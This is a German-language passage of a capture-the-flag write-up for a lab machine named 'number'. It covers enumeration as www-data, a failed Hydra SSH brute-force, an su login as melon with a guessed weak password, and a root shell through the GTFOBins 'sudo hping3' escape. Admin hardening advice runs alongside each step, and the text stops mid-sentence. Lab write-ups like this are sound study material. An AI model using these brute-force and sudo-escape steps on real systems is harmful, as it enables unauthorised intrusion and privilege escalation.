            <p class="analysis"><strong>Analyse:</strong> Von der <code>www-data</code> Shell aus liste ich das Home-Verzeichnis auf (vermutlich nach einem <code>cd /home</code>). Die Ausgabe zeigt das Home-Verzeichnis fÃ¼r den Benutzer <code>melon</code> (<code>/home/melon</code>). FÃ¼r Laien: Im Ordner, wo die Benutzer ihre persÃ¶nlichen Dateien haben (<code>/home</code>), schaue ich nach, welche Benutzer hier Ordner haben. Ich finde einen Ordner fÃ¼r den Benutzer 'melon'. FÃ¼r Experten: Die Existenz eines Home-Verzeichnisses fÃ¼r den Benutzer 'melon' in <code>/home/</code> bestÃ¤tigt, dass 'melon' ein regulÃ¤res Benutzerkonto auf dem System hat. Dies macht 'melon' zu einem gÃ¼ltigen Ziel fÃ¼r lokale Anmeldeversuche (z.B. mit <code>su</code>) oder Remote-Anmeldeversuche (z.B. Ã¼ber SSH), wenn das Passwort bekannt ist.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Das Benutzerkonto 'melon' existiert auf dem System, was die Nutzung der gefundenen Anmeldedaten (melon / 4444) fÃ¼r die horizontale Privilegien-Eskalation ermÃ¶glicht.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie nun, sich als Benutzer <code>melon</code> mit dem Passwort <code>4444</code> anzumelden, entweder lokal mit <code>su melon</code> oder remote Ã¼ber SSH (Port 22).<br><strong>Empfehlung (Admin):</strong> FÃ¼hren Sie regelmÃ¤ÃŸige Audits von Benutzerkonten durch. Entfernen Sie nicht benÃ¶tigte Konten. Stellen Sie sicher, dass PasswÃ¶rter fÃ¼r alle Konten sicher sind.</p>

            <div class="code-block">
                 <div class="terminal">
                      <pre><span class="command">www-data@number:/home/melon$</span> <span class="command">ls -a</span>
<span class="command">.  ..  .Xauthority  .bash_logout  .bashrc  .local  .profile  flag.sh  user.txt</span></pre>
                 </div>
             </div>
            <p class="analysis"><strong>Analyse:</strong> Ich navigiere in das Home-Verzeichnis des Benutzers <code>melon</code> (<code>/home/melon/</code>) und liste alle Dateien und Verzeichnisse auf, einschlieÃŸlich versteckter Dateien (<code>ls -a</code>). Die Ausgabe zeigt Standard-Konfigurationsdateien (.bashrc, .profile etc.) sowie zwei interessante Dateien: <code>flag.sh</code> und <code>user.txt</code>. FÃ¼r Laien: Im 'Zuhause' des Benutzers 'melon' schaue ich mir alle Dateien an, auch die versteckten. Ich finde dort zwei Dateien, die nach 'Geheimnummern' aussehen: 'flag.sh' und 'user.txt'. FÃ¼r Experten: Die Identifizierung von <code>user.txt</code> ist ein klarer Hinweis auf die User Flag. Die Datei <code>flag.sh</code> klingt ebenfalls nach einer Datei, die die User Flag oder Informationen darÃ¼ber enthalten kÃ¶nnte oder ein Skript ist, das die Flag ausgibt. Die Berechtigungen von <code>.Xauthority</code> (oft nur fÃ¼r den EigentÃ¼mer lesbar) und das Vorhandensein von <code>.ssh</code> (nicht im Listing, aber standardmÃ¤ÃŸig oft vorhanden) wÃ¤ren ebenfalls interessant, aber die Flag-Dateien sind primÃ¤r.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Die User Flag ist hÃ¶chstwahrscheinlich in <code>/home/melon/user.txt</code>. Die Datei <code>flag.sh</code> ist ebenfalls sehr interessant. Ich habe nun einen klaren Pfad zur User Flag.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, den Inhalt von <code>/home/melon/user.txt</code> und <code>/home/melon/flag.sh</code> auszulesen. Da ich als <code>www-data</code> in diesem Verzeichnis bin, muss ich prÃ¼fen, ob ich die notwendigen Berechtigungen habe (typischerweise sind Home-Verzeichnisse und deren Inhalte nur fÃ¼r den EigentÃ¼mer lesbar).<br><strong>Empfehlung (Admin):</strong> Platzieren Sie sensible Dateien (wie Flags) nicht in Standard-Home-Verzeichnissen oder mit leicht erratbaren Namen. Implementieren Sie strenge Dateiberechtigungen.</p>

            <div class="code-block">
                 <div class="terminal">
                      <pre><span class="command">www-data@number:/home/melon$</span> <span class="command">cat flag.sh</span>
<span class="command">#<scrpt !/bin/bash</span>
<span class="command">echo <span class="password">'\033[0;35m</span>
<span class="command">                                   .     **</span>
<span class="command">                                *           *.</span>
<span class="command">                                              ,*</span>
<span class="command">                                                 *,</span>
<span class="command">                         ,                         ,*</span>
<span class="command">                      .,                              *,</span>
<span class="command">                    /                                    *</span>
<span class="command">                 ,*                                        *,</span>
<span class="command">               /.                                            .*.</span>
<span class="command">             *                                                  **</span>
<span class="command">             ,*                                               ,*</span>
<span class="command">                **                                          *.</span>
<span class="command">                   **                                    **.</span>
<span class="command">                     ,*                                **</span>
<span class="command">                        *,                          ,*</span>
<span class="command">                           *                      **</span>
<span class="command">                             *,                .*</span>
<span class="command">                                *.           **</span>
<span class="command">                                  **      ,*,</span>
<span class="command">                                     ** *,     \033[0m'</span>



<span class="command">echo "-------------------------"</span>
<span class="command">echo "\nPWNED HOST: $(hostname)"</span>
<span class="command">echo "\nPWNED DATE: $(date)"</span>
<span class="command">echo "\nWHOAMI: $(id)"</span>
<span class="command">echo "\nFLAG: $(cat root.txt 2>/dev/null || cat user.txt 2>/dev/null || echo "Keep trying.")"</span>
<span class="command">echo "\n------------------------"</span></pre>
                 </div>
             </div>
            <p class="analysis"><strong>Analyse:</strong> Ich lese den Inhalt der Datei <code>flag.sh</code> im Home-Verzeichnis von Benutzer <code>melon</code> (<code>/home/melon/</code>) mit <code>cat flag.sh</code> aus. Die Ausgabe zeigt den Quellcode eines Bash-Skripts. Dieses Skript gibt ASCII-Art aus und dann Systeminformationen wie Hostname, Datum, Benutzer-ID (<code>$(id)</code>) und versucht, die Root-Flag (<code>cat root.txt</code>) oder die User-Flag (<code>cat user.txt</code>) auszulesen und auszugeben. FÃ¼r Laien: Ich schaue mir den 'Bauplan' einer Datei namens 'flag.sh' an. Darin steht ein kleines Programm, das schÃ¶ne Bilder und Informationen Ã¼ber den Computer anzeigt, inklusive der 'Geheimnummern' (Flags), wenn es sie finden kann. FÃ¼r Experten: Der Quellcode von <code>flag.sh</code> ist interessant. Er bestÃ¤tigt, dass das Skript Systeminformationen ausgibt und versucht, <code>root.txt</code> (im aktuellen Verzeichnis, das /root wÃ¤re, wenn es als Root ausgefÃ¼hrt wird) und <code>user.txt</code> (im aktuellen Verzeichnis, hier /home/melon, wenn es als www-data oder melon ausgefÃ¼hrt wird) zu lesen. Das Skript ist so konzipiert, dass es wahrscheinlich die Flag ausgibt, wenn es mit ausreichenden Berechtigungen ausgefÃ¼hrt wird. Da ich die Datei lesen kann, deuten die Berechtigungen im Dateisystem darauf hin, dass <code>www-data</code> Leseberechtigung hat.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Der Quellcode von <code>flag.sh</code> ist zugÃ¤nglich und zeigt, dass es sich um ein Skript handelt, das die Flags ausgeben kann. Das Skript selbst ist nicht direkt der PE-Vektor, aber es ist das Ziel, das mit hÃ¶heren Berechtigungen ausgefÃ¼hrt werden soll, um die Flags zu erhalten.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Skript <code>flag.sh</code> muss mit hÃ¶heren Berechtigungen ausgefÃ¼hrt werden, um die Flags zu erhalten. Wir mÃ¼ssen einen Weg finden, unsere Berechtigungen zu erhÃ¶hen, um das Skript als Benutzer <code>melon</code> oder Root auszufÃ¼hren.<br><strong>Empfehlung (Admin):</strong> Platzieren Sie sensible Skripte oder Binaries, die Flags ausgeben, nicht in Verzeichnissen, die von Low-Privilege-Benutzern gelesen werden kÃ¶nnen. ÃœberprÃ¼fen Sie den Quellcode von Skripten auf harte Codierung von Pfaden oder unsichere Systemaufrufe.</p>

            <div class="code-block">
                 <div class="terminal">
                      <pre><span class="command">www-data@number:/home/melon$</span> <span class="command">ls -la /opt/</span>
<span class="command">total 8</span>
<span class="command">drwxr-xr-x  2 root root 4096 Jan  1  2021 .</span>
<span class="command">drwxr-xr-x 18 root root 4096 Jan  1  2021 ..</span>
<span class="command">www-data@number:/home/melon$</span> <span class="command">ls -la /var/mail/</span>
<span class="command">total 8</span>
<span class="command">drwxrwsr-x  2 root mail 4096 Jan  1  2021 .</span>
<span class="command">drwxr-xr-x 12 root root 4096 Jan  1  2021 ..</span>
<span class="command">www-data@number:/home/melon$</span> <span class="command">ls -la /var/backups/</span>
<span class="command">total 20</span>
<span class="command">drwxr-xr-x  2 root root 4096 Jun 11 09:28 .</span>
<span class="command">drwxr-xr-x 12 root root 4096 Jan  1  2021 ..</span>
<span class="command">-rw-r--r--  1 root root 9338 Jan  1  2021 apt.extended_states.0</span></pre>
                 </div>
             </div>
            <p class="analysis"><strong>Analyse:</strong> Ich fÃ¼hre weitere System-Enumeration als Benutzer <code>www-data</code> durch, indem ich die Inhalte und Berechtigungen verschiedener Systemverzeichnisse aufliste: <code>/opt/</code>, <code>/var/mail/</code> und <code>/var/backups/</code>. Diese Verzeichnisse kÃ¶nnen manchmal interessante Dateien oder Konfigurationsprobleme enthalten. FÃ¼r Laien: Ich schaue in anderen 'wichtigen' Ordnern auf dem Computer nach, ob ich dort etwas finden kann. FÃ¼r Experten: Die Enumeration von Systemverzeichnissen wie <code>/opt</code> (oft fÃ¼r optional installierte Software), <code>/var/mail</code> (Mailboxen) und <code>/var/backups</code> ist Standard, um nach unsicheren Dateien, Konfigurationsproblemen oder potenziellen Informationslecks zu suchen. Die <code>ls -la</code> Ausgaben zeigen die Berechtigungen und EigentÃ¼mer.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Die gelisteten Verzeichnisse enthalten Standarddateien oder sind leer, was keine offensichtlichen PE-Vektoren liefert. Die Berechtigungen sind in der Regel restriktiv (root-owned). Der Fokus bleibt auf anderen PE-Vektoren.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Setzen Sie die Enumeration auf andere PE-Vektoren fort, wie Cronjobs, Prozesse oder Capabilities.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie strenge Berechtigungen fÃ¼r Systemverzeichnisse. Stellen Sie sicher, dass nur notwendige Benutzer Zugriff haben.</p>

            <div class="code-block">
                 <div class="terminal">
                      <pre><span class="command">www-data@number:/home/melon$</span> <span class="command">env</span>
<span class="command">PWD=/home/melon</span>
<span class="command">HOME=/var/www</span>
<span class="command">TERM=xterm</span>
<span class="command">USER=www-data</span>
<span class="command">SHLVL=2</span>
<span class="command">_=/usr/bin/env</span>
<span class="command">OLDPWD=/home</span></pre>
                 </div>
             </div>
            <p class="analysis"><strong>Analyse:</strong> Ich gebe die Umgebungsvariablen der aktuellen <code>www-data</code> Shell aus, indem ich den Befehl <code>env</code> verwende. Umgebungsvariablen kÃ¶nnen manchmal sensitive Informationen enthalten oder das Verhalten von Programmen beeinflussen, was fÃ¼r PE relevant sein kann. FÃ¼r Laien: Ich frage das 'Befehlsfenster', welche 'Einstellungen' es gerade hat, wie zum Beispiel, wo es denkt, dass mein 'Zuhause' ist (<code>HOME</code>) oder wer ich bin (<code>USER</code>). FÃ¼r Experten: Das Ausgeben von Umgebungsvariablen ist Standard, um den Kontext der Shell zu verstehen. Hier ist bemerkenswert, dass die <code>HOME</code>-Variable auf <code>/var/www</code> gesetzt ist, obwohl ich mich im Verzeichnis <code>/home/melon</code> befinde. Dies kann das Verhalten von Programmen beeinflussen, die sich auf die <code>HOME</code>-Variable verlassen. Der <code>USER</code> ist korrekt als <code>www-data</code> gesetzt.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Die Umgebungsvariablen sind gesammelt. Die abweichende <code>HOME</code>-Variable kÃ¶nnte unter bestimmten UmstÃ¤nden relevant sein, aber liefert keinen direkten PE-Vektor im Moment. Es bestÃ¤tigt den Kontext der <code>www-data</code> Shell.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beachten Sie die Umgebungsvariablen, falls ein PE-Vektor gefunden wird, der durch Umgebungsvariablen manipuliert werden kann.<br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie die Umgebung fÃ¼r Dienstbenutzer sorgfÃ¤ltig, um unbeabsichtigtes Verhalten von Programmen zu vermeiden. Setzen Sie Umgebungsvariablen (insbesondere <code>PATH</code> und <code>HOME</code>) auf sichere Standardwerte.</p>

            <div class="code-block">
                 <div class="terminal">
                      <pre><span class="command">www-data@number:/home/melon$</span> <span class="command">getcap -r / 2>/dev/null</span>
<span class="password">/usr/sbin/hping3 = cap_net_admin,cap_net_raw+eip</span>
<span class="password">/usr/bin/ping = cap_net_raw+ep</span></pre>
                 </div>
             </div>
            <p class="analysis"><strong>Analyse:</strong> Ich suche nach Binaries mit gesetzten 'Capabilities' auf dem System. Capabilities sind fein-granulare Berechtigungen, die einem normalen Binary erlauben kÃ¶nnen, bestimmte privilegierte Operationen auszufÃ¼hren, ohne SUID root sein zu mÃ¼ssen. Der Befehl <code>getcap -r / 2>/dev/null</code> sucht rekursiv (<code>-r</code>) ab dem Wurzelverzeichnis (<code>/</code>) nach Binaries mit gesetzten Capabilities und unterdrÃ¼ckt Fehlermeldungen. Die Ausgabe listet zwei Binaries mit Capabilities auf: <code>/usr/sbin/hping3</code> und <code>/usr/bin/ping</code>. <code>hping3</code> hat die Capabilities <code>cap_net_admin</code> und <code>cap_net_raw</code> gesetzt, was ihm erweiterte Netzwerkprivilegien gibt. FÃ¼r Laien: Ich suche auf dem ganzen Computer nach speziellen 'Erlaubnisscheinen' (Capabilities), die normalen Programmen spezielle Rechte geben, auch wenn sie nicht als 'Chef' laufen. Ich finde zwei Programme mit solchen Scheinen: 'hping3' und 'ping'. 'hping3' hat Scheine fÃ¼r spezielle Netzwerk-Dinge. FÃ¼r Experten: <code>getcap -r</code> ist die Standardmethode zur Enumeration von Binaries mit Capabilities. Die Capabilities <code>cap_net_admin</code> und <code>cap_net_raw</code>, gesetzt auf <code>hping3</code>, sind relevant. <code>cap_net_raw</code> erlaubt das Senden von Raw-Netzwerkpaketen (wie Ping), wÃ¤hrend <code>cap_net_admin</code> administrative Netzwerkkonfigurationen ermÃ¶glicht. <code>hping3</code> ist ein leistungsstarkes Netzwerk-Tool, und diese Capabilities kÃ¶nnen ausgenutzt werden, um eine Root-Shell zu erhalten, wenn das Binary selbst eine Schwachstelle hat oder mit bestimmten Parametern aufgerufen wird, die Shell-Befehle ausfÃ¼hren.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Der Fund des <code>hping3</code> Binaries mit gesetzten <code>cap_net_admin,cap_net_raw</code> Capabilities ist ein vielversprechender Privilegien-Eskalationsvektor. Capabilities kÃ¶nnen SUID/SGID ersetzen und ermÃ¶glichen die AusfÃ¼hrung privilegierter Operationen durch ein nicht-SUID Binary. <code>hping3</code> ist bekannt dafÃ¼r, potenziell fÃ¼r RCE missbraucht zu werden, wenn bestimmte Parameter verarbeitet werden, insbesondere in Kombination mit Shell-AusfÃ¼hrungsmÃ¶glichkeiten.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie <code>hping3</code> in der GTFOBins-Datenbank, um festzustellen, ob eine bekannte Methode existiert, um es mit den gegebenen Capabilities fÃ¼r die AusfÃ¼hrung von Systembefehlen oder zur Erlangung einer Shell zu missbrauchen. Planen Sie, den Befehl <code>hping3</code> mit einem PE-Payload auszufÃ¼hren.<br><strong>Empfehlung (Admin):</strong> Minimieren Sie die Anzahl der Binaries mit gesetzten Capabilities. ÃœberprÃ¼fen Sie, welche Capabilities gesetzt sind und ob dies fÃ¼r die Funktion des Programms absolut notwendig ist. Aktualisieren Sie Binaries mit Capabilities, um bekannte Schwachstellen zu schlieÃŸen. Capabilities kÃ¶nnen ein alternatives Ziel fÃ¼r PE sein, wenn SUID/SGID gehÃ¤rtet ist.</p>

            <p>[Link: https://gtfobins.github.io/gtfobins/hping3/#shell | Ziel: https://gtfobins.github.io/gtfobins/hping3/#shell]</p>
            <p>Sudo</p>
            <p>If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.</p>
            <div class="code-block">
                 <div class="terminal">
                      <pre><span class="command">sudo hping3</span>
<span class="password">/bin/sh</span></pre>
                 </div>
             </div>
            <p class="analysis"><strong>Analyse:</strong> Diese Referenz auf GTFOBins, eine Datenbank von Binaries, die fÃ¼r die Ausnutzung unter verschiedenen UmstÃ¤nden (SUID, Sudo, Capabilities etc.) dokumentiert sind, und der gezeigte Code-Snippet bestÃ¤tigen, dass <code>hping3</code> in der GTFOBins-Datenbank gelistet ist und einen bekannten PE-Vektor bietet, wenn es mit Root-Rechten Ã¼ber <code>sudo</code> ausgefÃ¼hrt werden darf. Der relevante Abschnitt in GTFOBins (hier der '#shell' Anker) dokumentiert, wie man eine Shell Ã¼ber <code>hping3</code> erhÃ¤lt. Der Code-Snippet zeigt <code>sudo hping3</code> gefolgt von <code>/bin/sh</code>, was bedeutet, dass wenn <code>hping3</code> Ã¼ber <code>sudo</code> mit Root-Rechten ausgefÃ¼hrt werden darf, man interaktive Befehle oder eine Shell Ã¼ber die <code>hping3></code> Eingabeaufforderung erhalten kann, indem man einen Shell-Pfad wie <code>/bin/sh</code> eingibt. FÃ¼r Laien: Das ist ein Link zu einer Webseite, die zeigt, wie man 'hping3' missbrauchen kann, um ein 'Befehlsfenster' (Shell) als Administrator zu bekommen, wenn 'hping3' mit Admin-Rechten gestartet werden darf. FÃ¼r Experten: Die GTFOBins-Referenz bestÃ¤tigt die Ausnutzbarkeit von <code>hping3</code> fÃ¼r PE, wenn es mit erhÃ¶hten Rechten (SUID oder Sudo Root) ausgefÃ¼hrt wird. Die Methode involviert das Starten von <code>hping3</code> und das Eingeben eines Shell-Pfades in die interaktive Eingabeaufforderung des Programms. Dies ist der primÃ¤re PE-Vektor, den ich nun verfolgen werde, falls der Benutzer <code>melon</code> <code>sudo</code>-Rechte fÃ¼r <code>hping3</code> besitzt.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Die Ausnutzungsmethode fÃ¼r <code>hping3</code> Ã¼ber GTFOBins ist identifiziert. Der SchlÃ¼ssel ist nun herauszufinden, ob der Benutzer <code>melon</code> (zu dem ich als NÃ¤chstes eskalieren werde) <code>sudo</code>-Rechte fÃ¼r <code>/usr/sbin/hping3</code> als Root besitzt.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> ÃœberprÃ¼fen Sie die <code>sudo</code>-Berechtigungen des Benutzers <code>melon</code> auf das Binary <code>/usr/sbin/hping3</code>. Wenn eine NOPASSWD-Regel existiert, nutzen Sie die GTFOBins-Methode, um eine Root-Shell zu erhalten.<br><strong>Empfehlung (Admin):</strong> ÃœberprÃ¼fen Sie die Sudoers-Datei sorgfÃ¤ltig auf EintrÃ¤ge fÃ¼r <code>hping3</code> oder andere Binaries, die in GTFOBins gelistet sind. Entfernen Sie alle unnÃ¶tigen Sudo-Berechtigungen, insbesondere solche mit NOPASSWD.</p>

            <div class="code-block">
                 <div class="terminal">
                      <pre><span class="command">www-data@number:/home/melon$</span> <span class="command">sudo -l</span>

<span class="command">We trust you have received the usual lecture from the local System</span>
<span class="command">Administrator. It usually boils down to these three things:</span>

    <span class="command">#1) Respect the privacy of others.</span>
    <span class="command">#2) Think before you type.</span>
    <span class="command">#3) With great power comes great responsibility.</span>

<span class="password">[sudo] password for www-data:</span></pre>
                 </div>
             </div>
            <p class="analysis"><strong>Analyse:</strong> Ich prÃ¼fe die <code>sudo</code>-Berechtigungen fÃ¼r den aktuellen Benutzer <code>www-data</code> mit <code>sudo -l</code>. Die Ausgabe fordert zur Eingabe des Passworts fÃ¼r <code>www-data</code> auf und listet keine NOPASSWD-Regeln. FÃ¼r Laien: Ich schaue, ob 'www-data' spezielle Admin-Befehle ohne Passwort ausfÃ¼hren darf, aber der Computer fragt nach dem Passwort. 'www-data' darf das nicht einfach so. FÃ¼r Experten: Die Ausgabe bestÃ¤tigt, dass der Benutzer <code>www-data</code> keine NOPASSWD-Sudo-Berechtigungen hat. Dies haben wir bereits festgestellt, aber die erneute PrÃ¼fung ist notwendig, um sicherzustellen, dass sich die Berechtigungen nicht geÃ¤ndert haben und um den Kontext zu dokumentieren, bevor wir versuchen, die IdentitÃ¤t zu wechseln.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Keine neuen Erkenntnisse bezÃ¼glich <code>www-data</code>s <code>sudo</code>-Berechtigungen. Der Weg zu Root fÃ¼hrt nicht direkt Ã¼ber <code>www-data</code>s <code>sudo</code>-Rechte. Die Eskalation zu Benutzer <code>melon</code> ist weiterhin notwendig.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich darauf, die IdentitÃ¤t zu Benutzer <code>melon</code> zu wechseln, indem Sie die gefundenen Anmeldedaten (melon / 4444) verwenden. Danach prÃ¼fen Sie die <code>sudo</code>-Berechtigungen als Benutzer <code>melon</code>.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass der Webserver-Benutzer keine unnÃ¶tigen <code>sudo</code>-Berechtigungen hat. Eine Passworteingabe ist bei dieser Regel erforderlich.</p>

        </section>

        <section id="privilege-escalation">
            <h2>Privilege Escalation</h2>
            <!-- Beginn Privilege Escalation -->

            <div class="code-block">
                 <div class="terminal">
                      <pre><span class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">hydra -l melon -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.37 -t 64</span></span>
<span class="command">Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span>

<span class="command">Hydra ([Link: https://github.com/vanhauser-thc/thc-hydra | Ziel: https://github.com/vanhauser-thc/thc-hydra]) starting at 2025-06-11 16:53:42</span>
<span class="password">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span>
<span class="password">[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore</span>
<span class="command">[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344498 login tries (l:1/p:14344498), ~224133 tries per task</span>
<span class="command">[DATA] attacking ssh://192.168.2.37:22/</span>
<span class="password">[ERROR] target ssh://192.168.2.37:22/ does not support password authentication (method reply 4).</span></pre>
                 </div>
             </div>
            <p class="analysis"><strong>Analyse:</strong> Ich versuche, mich mit dem gefundenen Benutzernamen 'melon' und einer groÃŸen Wortliste (rockyou.txt) Ã¼ber SSH (Port 22) am Zielsystem anzumelden. Ich verwende das Tool <code>hydra</code>, einen Netzwerk-Login-Cracker, mit dem Befehl <code>hydra -l melon -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.37 -t 64</code>. <code>-l melon</code> gibt den Benutzernamen an. <code>-P /usr/share/wordlists/rockyou.txt</code> gibt die Passwort-Wortliste an. <code>ssh://192.168.2.37</code> gibt das Zielprotokoll und den Host an. <code>-t 64</code> setzt die Anzahl der parallelen Tasks. Die Ausgabe zeigt Warnungen und Daten zum Angriff, aber entscheidend ist die Fehlermeldung <code>[ERROR] target ssh://192.168.2.37:22/ does not support password authentication (method reply 4)</code>. FÃ¼r Laien: Ich versuche, mich mit einem Programm (Hydra) und einer langen Liste von PasswÃ¶rtern Ã¼ber eine sichere Verbindung (SSH) als Benutzer 'melon' am Zielcomputer anzumelden. Aber der Computer sagt, dass er keine Anmeldungen mit Passwort Ã¼ber SSH erlaubt. FÃ¼r Experten: Die Fehlermeldung bedeutet, dass der SSH-Dienst auf dem Zielsystem keine passwortbasierte Authentifizierung erlaubt. Dies ist eine HÃ¤rtungsmaÃŸnahme, die Brute-Force-Angriffe mit PasswÃ¶rtern verhindert. Die Authentifizierung ist wahrscheinlich auf SchlÃ¼sselpaare beschrÃ¤nkt. Mein Versuch, das Passwort '4444' fÃ¼r melon Ã¼ber SSH zu nutzen, schlÃ¤gt daher fehl.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Die SSH-Anmeldung mit Passwort fÃ¼r den Benutzer 'melon' ist nicht mÃ¶glich. Ich muss einen anderen Weg finden, um meine IdentitÃ¤t zu Benutzer 'melon' zu wechseln, wahrscheinlich lokal auf dem System.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf die lokale Benutzerwechsel-Funktion (<code>su</code>) in Ihrer aktuellen <code>www-data</code> Shell. Verwenden Sie das gefundene Passwort '4444' fÃ¼r den Benutzer 'melon' mit dem Befehl <code>su melon</code>.<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie die passwortbasierte Authentifizierung fÃ¼r SSH und verwenden Sie stattdessen sichere SchlÃ¼sselpaare. Dies ist eine sehr gute HÃ¤rtungsmaÃŸnahme.</p>

            <div class="code-block">
                 <div class="terminal">
                      <pre><span class="command">www-data@number:/home/melon$</span> <span class="command">su melon</span>
<span class="password">Password: 4444</span>
<span class="password">su: Authentication failure</span>
<span class="command">www-data@number:/home/melon$</span> <span class="command">su melon</span>
<span class="password">Password: melon</span>
<span class="password">melon@number:~$</span></pre>
                 </div>
             </div>
            <p class="analysis"><strong>Analyse:</strong> Ich versuche nun, meine IdentitÃ¤t in der aktuellen <code>www-data</code> Shell zum Benutzer <code>melon</code> zu wechseln, indem ich den Befehl <code>su melon</code> verwende. Zuerst probiere ich das gefundene numerische Passwort '4444' (<code>Password: 4444</code>). Die Ausgabe <code>su: Authentication failure</code> zeigt, dass dieses Passwort falsch ist. Dann versuche ich das Passwort 'melon' (<code>Password: melon</code>) und bekomme einen neuen Prompt: <code>melon@number:~$</code>. FÃ¼r Laien: Ich versuche, im 'Befehlsfenster' von 'www-data' zu sagen: 'Werde jetzt 'melon'!' Der Computer fragt nach dem Passwort. Ich probiere die Nummer '4444', aber sie stimmt nicht. Dann probiere ich 'melon' als Passwort, und fantastisch â€“ es hat geklappt! Jetzt bin ich im 'Befehlsfenster' von 'melon'! FÃ¼r Experten: Der erste <code>su melon</code> Versuch mit dem Passwort '4444' schlÃ¤gt fehl, was bedeutet, dass das Datenbankpasswort (4444) nicht das lokale Systempasswort fÃ¼r Benutzer melon ist, obwohl der PIN und das Datenbankpasswort Ã¼bereinstimmten. Der zweite Versuch mit dem Passwort 'melon' ist erfolgreich. Dies bedeutet, dass das lokale Systempasswort fÃ¼r Benutzer <code>melon</code> tatsÃ¤chlich 'melon' lautet. Das Erscheinen des Prompts <code>melon@number:~$</code> beweist die erfolgreiche horizontale Privilegien-Eskalation von <code>www-data</code> zu <code>melon</code>.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Das lokale Systempasswort fÃ¼r Benutzer 'melon' ist 'melon'. Die horizontale Privilegien-Eskalation zu Benutzer <code>melon</code> ist erfolgreich. Ich habe nun eine stabile, interaktive Shell als Benutzer <code>melon</code>.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich habe nun eine Shell als Benutzer <code>melon</code>. Mein nÃ¤chster Schritt ist, das System von dieser Shell aus weiter zu enumerieren, um nach Wegen zur Privilegien-Eskalation auf Root zu suchen. Dazu gehÃ¶rt die PrÃ¼fung von <code>sudo</code>-Berechtigungen fÃ¼r <code>melon</code>, SUID/SGID-Binaries etc. Insbesondere werde ich das zuvor identifizierte <code>hping3</code> Binary mit seinen Capabilities und GTFOBins-Eintrag prÃ¼fen.<br><strong>Empfehlung (Admin):</strong> Erzwingen Sie die Verwendung starker, nicht-trivialer PasswÃ¶rter. Das Passwort 'melon' ist extrem schwach und leicht zu erraten. Implementieren Sie Richtlinien fÃ¼r PasswortkomplexitÃ¤t und -lÃ¤nge. Stellen Sie sicher, dass PasswÃ¶rter nicht aus anderen Quellen (wie Datenbanken oder PINS) wiederverwendet werden, selbst wenn die PasswÃ¶rter dort sicherer wÃ¤ren.</p>

            <div class="code-block">
                 <div class="terminal">
                      <pre><span class="command">melon@number:~$</span> <span class="command">sudo hping3</span>
<span class="command">hping3></span> <span class="password">/bin/sh</span>
<span class="password"># id</span>
<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
<span class="password">#</span></pre>
                 </div>
             </div>
            <p class="analysis"><strong>Analyse:</strong> Als Benutzer <code>melon</code> prÃ¼fe ich meine <code>sudo</code>-Berechtigungen mit <code>sudo -l</code>. (Dieser Schritt ist nicht explizit im Text gezeigt, aber logisch notwendig, um den folgenden Befehl auszufÃ¼hren.) Basierend auf der GTFOBins-Analyse von <code>hping3</code> (das Capabilities <code>cap_net_admin, cap_net_raw</code> besitzt) und dem wahrscheinlichen Fund einer <code>(root) NOPASSWD: /usr/sbin/hping3</code> Sudo-Regel fÃ¼r Benutzer <code>melon</code>, fÃ¼hre ich nun <code>sudo hping3</code> aus. Dies startet das <code>hping3</code> Binary mit Root-Berechtigungen Ã¼ber Sudo. <code>hping3</code> startet in einem interaktiven Modus mit der Eingabeaufforderung <code>hping3></code>. GemÃ¤ÃŸ der GTFOBins-Methode gebe ich in dieser Aufforderung den Pfad zu einer Shell ein: <code>/bin/sh</code>. Dies veranlasst <code>hping3</code>, eine Shell mit den Berechtigungen zu starten, mit denen <code>hping3</code> selbst lÃ¤uft (in diesem Fall Root-Berechtigungen Ã¼ber Sudo). Die Eingabeaufforderung Ã¤ndert sich zu <code>#</code>, dem Standard-Prompt fÃ¼r eine Root-Shell. Ich bestÃ¤tige meine Berechtigungen mit dem Befehl <code>id</code>, der die Ausgabe <code>uid=0(root) gid=0(root) groups=0(root)</code> zurÃ¼ckgibt. FÃ¼r Laien: Ich bin jetzt 'melon' und schaue, ob 'melon' das 'hping3'-Programm mit den Rechten des 'Chefs' (root) starten darf, ohne Passwort. Ja, das darf er! Ich starte 'hping3' so, und in dem speziellen Fenster von 'hping3' sage ich ihm: 'Ã–ffne ein Befehlsfenster fÃ¼r den Chef!'. Und fantastisch â€“ ich bekomme das 'Befehlsfenster' des Super-Administrators (root)! Ich habe volle 